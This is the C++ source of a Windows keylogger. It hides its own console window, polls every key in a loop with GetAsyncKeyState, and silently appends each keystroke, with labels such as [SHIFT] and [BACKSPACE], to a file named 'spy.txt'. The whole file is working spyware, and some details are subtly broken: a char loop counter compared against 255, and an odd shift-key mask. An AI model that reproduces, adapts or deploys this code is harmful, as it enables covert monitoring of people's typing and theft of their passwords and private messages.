#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

int Save(int key, const char* file)
{
	FILE* OUTPUT_FILE = fopen(file, "a+");

	if (key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		if (!lowercase)
			key = tolower(key);

		fprintf(OUTPUT_FILE, "%s", (char*)&key);
	}
	fclose(OUTPUT_FILE);
	return 0;
}

int main()
{
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);	// handle to the top-level window
	ShowWindow(hWnd, SW_HIDE);
	char i;

	FILE* fd = fopen("spy.txt", "w");
	fclose(fd);

	while (true)
	{
		for (i = 8; i <= 255; i++) {
			//short res = GetAsyncKeyState(i);
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "spy.txt");
			}
		}
	}
	return 0;
}